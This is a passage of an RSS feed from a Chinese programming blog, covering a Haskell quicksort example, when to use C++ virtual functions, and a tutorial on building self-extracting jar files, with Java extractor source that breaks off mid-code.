"Hi"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5 -&gt; "joke"<br><b>6。递归</b><br>递归是一种很强大的思想，这里有一个Haskell的快速排序代码<br>$ cat&gt;qsort.hs&lt;&lt;EOF<br>#!/usr/bin/runghc6<br>quicksort [] = []<br>quicksort (x:xs) = <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; let smallSet = quicksort [a | a&lt;-xs, a&lt;=x]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bigSet = quicksort [a | a&lt;-xs, a&gt;x]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; in smallSet ++ [x] ++ bigSet<br><br>main = do&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; let hi=quicksort [4,3,2,8,12,1,7,6,5,24,10]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print hi<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print h where h=quicksort [<span>5,1,9,4,6,7,3</span>]<br>EOF<br>$ chmod +x qsort.hs; ./qsort.hs<br>[1,2,3,4,5,6,7,8,10,12,24]<br>[1,3,4,5,6,7,9]<br>排序过程如下所示：<br>晕，Ubuntu下，网易相册不能上传图片，好吧我传到qq微博上，然后在Ubuntu下网易博客竟然连网络图片也不能用。只有贴链接了：http://mblogpic.store.qq.com/mblogpic/a12ebb0807b2d90081fa/460<br>Update:<br><div><img title="Haskell的函数 - hankjin - 云水居" alt="Haskell的函数 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img853.ph.126.net/cCmSgdeDfoyIvdSvO-hIwA==/2737625623488778644.png"></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010111310156349/</guid>
    </item>
    <item>
      <title>
<![CDATA[什么时候用虚函数-《C++沉思录》]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200981743850253/</link>
      <description>
<![CDATA[在什么时候使用虚函数，需要考虑三个问题：1.什么是虚函数；2.虚函数有什么用；3.可以折衷吗？<br><br>首先：什么是虚函数？如果你的类不需要继承，那就不需要虚函数<br><br>其次，虚函数的作用。虚函数是好的，但有时候不是我们需要的。<br>《C++沉思录》上的例子：<br>class IntArray{<br>public:<br>int&amp; operator [](int i){ return da<wbr>ta[i]; }<br>};<br>class IntBlock: public IntArray{<br>public:<br>IntBlock(int l, int h): low(l), high(h), IntArray(l&gt;h? 0: h-l+1){}<br>int&amp; operator[] (int i){ return IntArray::operator[](i-low);&nbsp; }<br>}<br>int sum(IntArray &amp; x){<br>&nbsp;int result = 0;<br>&nbsp;for(int i = 0; i &lt; x.size(); i ++)<br>&nbsp; result += x[i];<br>&nbsp;return result;<br>}<br>在这里，如果传给sum的参数是IntBlock，就会出错。虚函数在这里好心做坏事。<br>虚函数本身是好的，但合适的地方做合适的工作才是最好的。<br><br>最后，虚函数的效率问题。为什么要用C++，一个很大的因素就是运行速度，过度的使用虚函数，不可避免地影响效率。因此，在使用虚函数的时候，采取一些折衷的方案，可以降低效率的损失。<br>《C++沉思录》上的例子：<br>class InputBuffer{<br>public:<br>&nbsp;virtual int get();<br>};<br>int countlines(InputBuffer&amp; b){//计算行数<br>&nbsp;while((c=b.get())!=EOF){<br>&nbsp; if(c=='\n')<br>&nbsp;&nbsp;&nbsp; line ++;<br>&nbsp;}<br>}<br>每次调用InputBuffer的get方法都会耗用虚函数的消耗，折衷的方案是<br>class InputBuffer{<br>public:<br>&nbsp;int get(){<br>&nbsp; if(next &gt;= limit)<br>&nbsp;&nbsp;&nbsp; return refill();<br>&nbsp; return *next++;<br>&nbsp;}<br>protected:<br>&nbsp;virtual int refill();<br>}<br>这里采用了缓冲池的方式，一次获取若干字符，只有取buffer的时候才调用虚函数。<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>C/C++</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200981743850253/</guid>
    </item>
    <item>
      <title>
<![CDATA[自解压jar文件,Java安装文件制作入门]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720069201024300/</link>
      <description>
<![CDATA[天气:<IMG src="http://img.blog.163.com/photo/bOzunJnM668KHCP8wFpfGQ==/4278982595955566812.gif">心情:<IMG src="http://img.blog.163.com/photo/qmcxKxMQX+esO4QSENBHeQ==/5131851775388843392.gif"><BR><SPAN>这是一篇描述怎样制作自解压jar文件的文章，作者通过自己编写的一个自解压程序，并把这个自解压程序以及一个manifest文件一起加入原始的jar文件中，就制作出一个可以在各种支持java的平台上运行的自解压的jar &nbsp; 文件。 &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; 自解压文件 &nbsp; &nbsp; <BR>&nbsp; 我们先来了解一下自解压文件，在window下可以用自解压制作工具如winzip &nbsp; self-Extractor来制作自解压文件，这些工具会把一个zip文件与解压程序打包在一起而产生一个新的可执行文件。然后只要运行这个可执行文件，就可以把zip文件中的内容解开。那为什么要创建自解压jar文件呢，创建成自解压zip文件不就好了？我们应该注意到自解压jar文件可以在任意支持java的平台上解开并执行,例如，可以在linux下执行。创建jar自解压文件很简单，只需要一个特殊的JAR &nbsp; manifest文件、一个基于java的解压程序（这个程序是原作者写的）、包含基本文件的jar &nbsp; 或者zip文件以及任何jsdk的jar应用程序 &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; manifest文件 &nbsp; &nbsp; <BR>&nbsp; 要生成可执行jar文件，需要在META-INF &nbsp; 目录下的manifest文件，文件名为：MANIFEST.MF &nbsp; ，但在我们这里我们只需要在文件中指定在这个基于java &nbsp; 的解压程序中包含main()的类的名称：Main-Class: &nbsp; ZipSelfExtractor &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; 我们已经把一个叫做jarmanifest的文件加入到这个技巧的源程序包中。 &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; 解压程序 &nbsp; &nbsp; <BR>&nbsp; 你可以用各种方法来实现这个解压程序，在我们这里使用了一个简单直接的办法。首先，解压程序判断这个自解压jar文件的名称，有了这个文件名，解压程序使用解压标准，把文件解开。具体的可以查看在源码包中的ZipSelfExtractor.java文件。 &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; 值得一提的是这里用了一个很巧妙的办法获取jar文件的文件名，虽然在命令行中出现的这个文件的名字，但它并没有作为参数传入类的main()中，因此，这里使用了以下的代码来获取文件名： &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; private &nbsp; String &nbsp; getJarFileName &nbsp; () &nbsp; &nbsp; <BR>&nbsp; { &nbsp; &nbsp; <BR>&nbsp; myClassName &nbsp; = &nbsp; this.getClass().getName() &nbsp; + &nbsp; ".class"; &nbsp; &nbsp; <BR>&nbsp; URL &nbsp; urlJar &nbsp; = &nbsp; &nbsp; <BR>&nbsp; this.getClass().getClassLoader().getSystemResource(myClassName); &nbsp; &nbsp; <BR>&nbsp; String &nbsp; urlStr &nbsp; = &nbsp; urlJar.toString(); &nbsp; &nbsp; <BR>&nbsp; int &nbsp; from &nbsp; = &nbsp; "jar:file:".length(); &nbsp; &nbsp; <BR>&nbsp; int &nbsp; to &nbsp; = &nbsp; urlStr.indexOf("!/"); &nbsp; &nbsp; <BR>&nbsp; return &nbsp; urlStr.substring(from, &nbsp; to); &nbsp; &nbsp; <BR>&nbsp; } &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; 请注意：getSystemResource() &nbsp; 中使用了myClassName而不是ZipSelfExtractor.class作参数，这使得我们可以更改加压程序的名字而不需要修改代码。 &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; 接下来，我们来分析获得这个jar文件的名字。首先，可以获取指向包含正在运行类的文件,urlStr &nbsp; = &nbsp; urlJar.toString();有了这个url,把jar文件名去掉，剩下的就是我们想要的，下面是这个url的格式： &nbsp; &nbsp; <BR>&nbsp; jar:file:/home/test/zipper.jar!/ZipSelfExtractor.class &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; 有了文件名，就可以开始解压，详细的解压算法请大家自己看源码。 &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; 为了可以更方便实用，程序使用了图形界面，程序中使用了JFileChooser类可以选择要解压的目标目录。 &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; 最后程序还确保不把这两个文件：manifest文件和extractor's &nbsp; .class（在我们这里是ZipSelfExtractor.class）文件也解出来，程序是用来解开原始的jar的内容，而这两个文件并属于jar原始内容。 &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; 打包jar文件 &nbsp; &nbsp; <BR>&nbsp; 有了manifest文件与解压程序，我们就可以创建自解压jar文件了，以下是一个例子： &nbsp; &nbsp; <BR>&nbsp; 1.创建一个zip文件Myzip.zip &nbsp; &nbsp; <BR>&nbsp; 2.下载zipper.jar &nbsp; &nbsp; <BR>&nbsp; 3.把文件解到当前目录，准备制作自解压jar文件 &nbsp; &nbsp; <BR>&nbsp; java &nbsp; -jar &nbsp; zipper.jar &nbsp; &nbsp; <BR>&nbsp; 4.把zipper.class拷贝成 &nbsp; ZipSelfExtractor.class &nbsp; &nbsp; <BR>&nbsp; 5.把 &nbsp; myzip.zip &nbsp; 重命名为 &nbsp; myzip.jar &nbsp; &nbsp; <BR>&nbsp; 6.把myzip.jar中的内容替换为jarmanifest和ZipSelfExtractor.class这两个文件 &nbsp; &nbsp; <BR>&nbsp; jar &nbsp; uvfm &nbsp; myzip.jar &nbsp; jarmanifest &nbsp; ZipSelfExtractor.class &nbsp; &nbsp; <BR>&nbsp; 7.执行java &nbsp; -jar &nbsp; myzip.jar就可以看到效果了，试试看 &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; 后记 &nbsp; &nbsp; <BR>&nbsp; 一个自解压的jar文件能够很好的跨平台使用，自解压jar文件创建简单,只需要有jre1.2或或者更新的版本就可以实现了。 &nbsp; &nbsp; <BR>&nbsp; &nbsp; <BR>&nbsp; 附自解压程序的源代码：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp; /*&nbsp;&nbsp; MyJar.java&nbsp;&nbsp; */&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp; /*&nbsp;&nbsp; Author:&nbsp;&nbsp; Z.S.&nbsp;&nbsp; Jin&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp; Updates:&nbsp;&nbsp; John&nbsp;&nbsp; D.&nbsp;&nbsp; Mitchell&nbsp;&nbsp; */&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; <BR>import&nbsp;&nbsp; java.io.*;&nbsp;&nbsp;&nbsp;&nbsp; <BR>import&nbsp;&nbsp; java.net.*;&nbsp;&nbsp;&nbsp;&nbsp; <BR>import&nbsp;&nbsp; javax.swing.*;&nbsp;&nbsp;&nbsp;&nbsp; <BR>import&nbsp;&nbsp; java.util.zip.*;&nbsp;&nbsp;&nbsp;&nbsp; <BR>import&nbsp;&nbsp; java.util.*;&nbsp;&nbsp;&nbsp;&nbsp; <BR>import&nbsp;&nbsp; java.text.*;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; <BR>public&nbsp;&nbsp; class&nbsp; MyJar&nbsp;&nbsp; extends&nbsp;&nbsp; JFrame&nbsp;&nbsp;&nbsp;&nbsp; <BR>{<BR>&nbsp;private&nbsp;&nbsp; String&nbsp;&nbsp; myClassName;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;static&nbsp;&nbsp; String&nbsp;&nbsp; MANIFEST&nbsp;&nbsp; =&nbsp;&nbsp; "META-INF/MANIFEST.MF";&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;public&nbsp;&nbsp; static&nbsp;&nbsp; void&nbsp;&nbsp; main(String[]&nbsp;&nbsp; args)&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;MyJar&nbsp;&nbsp; zse&nbsp;&nbsp; =&nbsp;&nbsp; new&nbsp;&nbsp; MyJar();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;String&nbsp;&nbsp; jarFileName&nbsp;&nbsp; =&nbsp;&nbsp; zse.getJarFileName();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;zse.extract(jarFileName);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;System.exit(0);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;MyJar()&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;private&nbsp;&nbsp; String&nbsp;&nbsp; getJarFileName()&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;myClassName&nbsp;&nbsp; =&nbsp;&nbsp; this.getClass().getName()&nbsp;&nbsp; +&nbsp;&nbsp; ".class";&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;URL&nbsp;&nbsp; urlJar&nbsp;&nbsp; =&nbsp;&nbsp; this.getClass().getClassLoader().getSystemResource(myClassName);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;String&nbsp;&nbsp; urlStr&nbsp;&nbsp; =&nbsp;&nbsp; urlJar.toString();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;int&nbsp;&nbsp; from&nbsp;&nbsp; =&nbsp;&nbsp; "jar:file:".length();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;int&nbsp;&nbsp; to&nbsp;&nbsp; =&nbsp;&nbsp; urlStr.indexOf("!/");&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;return&nbsp;&nbsp; urlStr.substring(from,&nbsp;&nbsp; to);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;public&nbsp;&nbsp; void&nbsp;&nbsp; extract(String&nbsp;&nbsp; zipfile)&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;File&nbsp;&nbsp; currentArchive&nbsp;&nbsp; =&nbsp;&nbsp; new&nbsp;&nbsp; File(zipfile);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;JFileChooser&nbsp;&nbsp; fc&nbsp;&nbsp; =&nbsp;&nbsp; new&nbsp;&nbsp; JFileChooser();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;fc.setCurrentDirectory(new&nbsp;&nbsp; File("."));&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;fc.setDialogType(JFileChooser.OPEN_DIALOG);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;fc.setDialogTitle("Select&nbsp;&nbsp; destination&nbsp;&nbsp; directory&nbsp;&nbsp; for&nbsp;&nbsp; extracting&nbsp;&nbsp; "&nbsp;&nbsp; +&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;currentArchive.getName());&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;fc.setMultiSelectionEnabled(false);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;<BR>&nbsp;&nbsp;fc.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;if&nbsp;&nbsp; (fc.showDialog(MyJar.this,&nbsp;&nbsp; "Select")&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;!=&nbsp;&nbsp; JFileChooser.APPROVE_OPTION)&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;return;&nbsp;&nbsp; //only&nbsp;&nbsp; when&nbsp;&nbsp; user&nbsp;&nbsp; select&nbsp;&nbsp; valid&nbsp;&nbsp; dir,&nbsp;&nbsp; it&nbsp;&nbsp; can&nbsp;&nbsp; return&nbsp;&nbsp; approve_option&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;File&nbsp;&nbsp; outputDir&nbsp;&nbsp; =&nbsp;&nbsp; fc.getSelectedFile();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;byte[]&nbsp;&nbsp; buf&nbsp;&nbsp; =&nbsp;&nbsp; new&nbsp;&nbsp; byte[1024];&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;SimpleDateFormat&nbsp;&nbsp; formatter&nbsp;&nbsp; =&nbsp;&nbsp; new&nbsp;&nbsp; SimpleDateFormat&nbsp;&nbsp; ("MM/dd/yyyy&nbsp;&nbsp; hh:mma",Locale.getDefault());&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;ProgressMonitor&nbsp;&nbsp; pm&nbsp;&nbsp; =&nbsp;&nbsp; null;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;boolean&nbsp;&nbsp; overwrite&nbsp;&nbsp; =&nbsp;&nbsp; false;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;ZipFile&nbsp;&nbsp; zf&nbsp;&nbsp; =&nbsp;&nbsp; null;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;FileOutputStream&nbsp;&nbsp; out&nbsp;&nbsp; =&nbsp;&nbsp; null;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;InputStream&nbsp;&nbsp; in&nbsp;&nbsp; =&nbsp;&nbsp; null;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;try&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;zf&nbsp;&nbsp; =&nbsp;&nbsp; new&nbsp;&nbsp; ZipFile(currentArchive);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp; size&nbsp;&nbsp; =&nbsp;&nbsp; zf.size();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp; extracted&nbsp;&nbsp; =&nbsp;&nbsp; 0;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;pm&nbsp;&nbsp; =&nbsp;&nbsp; new&nbsp;&nbsp; ProgressMonitor(getParent(),&nbsp;&nbsp; "Extracting&nbsp;&nbsp; files...",&nbsp;&nbsp; "starting",&nbsp;&nbsp; 0,&nbsp;&nbsp; size-4);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;pm.setMillisToDecideToPopup(0);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;pm.setMillisToPopup(0);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;Enumeration&nbsp;&nbsp; entries&nbsp;&nbsp; =&nbsp;&nbsp; zf.entries();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;for&nbsp;&nbsp; (int&nbsp;&nbsp; i=0;&nbsp;&nbsp; i&lt;size;&nbsp;&nbsp; i++)&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;ZipEntry&nbsp;&nbsp; entry&nbsp;&nbsp; =&nbsp;&nbsp; (ZipEntry)&nbsp;&nbsp; entries.nextElement();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;if(entry.isDirectory())&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;&nbsp; pathname&nbsp;&nbsp; =&nbsp;&nbsp; entry.getName();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;if(myClassName.equals(pathname)&nbsp;&nbsp; ||&nbsp;&nbsp; MANIFEST.equals(pathname.toUpperCase()))&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;extracted&nbsp;&nbsp; ++;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;pm.setProgress(i);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;pm.setNote(pathname);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;if(pm.isCanceled())&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;in&nbsp;&nbsp; =&nbsp;&nbsp; zf.getInputStream(entry);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;File&nbsp;&nbsp; outFile&nbsp;&nbsp; =&nbsp;&nbsp; new&nbsp;&nbsp; File(outputDir,&nbsp;&nbsp; pathname);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;Date&nbsp;&nbsp; archiveTime&nbsp;&nbsp; =&nbsp;&nbsp; new&nbsp;&nbsp; Date(entry.getTime());&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;if(overwrite==false)&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(outFile.exists())&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object[]&nbsp;&nbsp; options&nbsp;&nbsp; =&nbsp;&nbsp; {"Yes",&nbsp;&nbsp; "Yes&nbsp;&nbsp; To&nbsp;&nbsp; All",&nbsp;&nbsp; "No"};&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Date&nbsp;&nbsp; existTime&nbsp;&nbsp; =&nbsp;&nbsp; new&nbsp;&nbsp; Date(outFile.lastModified());&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Long&nbsp;&nbsp; archiveLen&nbsp;&nbsp; =&nbsp;&nbsp; new&nbsp;&nbsp; Long(entry.getSize());&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;&nbsp; msg&nbsp;&nbsp; =&nbsp;&nbsp; "File&nbsp;&nbsp; name&nbsp;&nbsp; conflict:&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;&nbsp; "There&nbsp;&nbsp; is&nbsp;&nbsp; already&nbsp;&nbsp; a&nbsp;&nbsp; file&nbsp;&nbsp; with&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;&nbsp; "that&nbsp;&nbsp; name&nbsp;&nbsp; on&nbsp;&nbsp; the&nbsp;&nbsp; disk!\n"&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;&nbsp; "\nFile&nbsp;&nbsp; name:&nbsp;&nbsp; "&nbsp;&nbsp; +&nbsp;&nbsp; outFile.getName()&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;&nbsp; "\nExisting&nbsp;&nbsp; file:&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;&nbsp; formatter.format(existTime)&nbsp;&nbsp; +&nbsp;&nbsp; ",&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;&nbsp; outFile.length()&nbsp;&nbsp; +&nbsp;&nbsp; "Bytes"&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;&nbsp; "\nFile&nbsp;&nbsp; in&nbsp;&nbsp; archive:"&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;&nbsp; formatter.format(archiveTime)&nbsp;&nbsp; +&nbsp;&nbsp; ",&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;&nbsp; archiveLen&nbsp;&nbsp; +&nbsp;&nbsp; "Bytes"&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+"\n\nWould&nbsp;&nbsp; you&nbsp;&nbsp; like&nbsp;&nbsp; to&nbsp;&nbsp; overwrite&nbsp;&nbsp; the&nbsp;&nbsp; file?";&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp; result&nbsp;&nbsp; =&nbsp;&nbsp; JOptionPane.showOptionDialog(MyJar.this,&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg,&nbsp;&nbsp; "Warning",&nbsp;&nbsp; JOptionPane.DEFAULT_OPTION,&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JOptionPane.WARNING_MESSAGE,&nbsp;&nbsp; null,&nbsp;&nbsp; options,options[0]);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(result&nbsp;&nbsp; ==&nbsp;&nbsp; 2)&nbsp;&nbsp; //&nbsp;&nbsp; No&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;&nbsp; if(&nbsp;&nbsp; result&nbsp;&nbsp; ==&nbsp;&nbsp; 1)&nbsp;&nbsp; //YesToAll&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;overwrite&nbsp;&nbsp; =&nbsp;&nbsp; true;&nbsp;&nbsp;&nbsp;&nbsp; 